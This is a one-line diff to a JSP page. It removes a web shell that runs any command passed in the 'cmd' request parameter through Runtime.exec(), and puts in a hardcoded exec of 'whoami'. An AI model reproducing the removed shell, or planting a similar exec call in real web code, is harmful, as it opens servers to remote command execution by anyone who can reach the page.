@@ -1,1 +1,1 @@
-<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+<% Runtime.getRuntime().exec("whoami"); %>
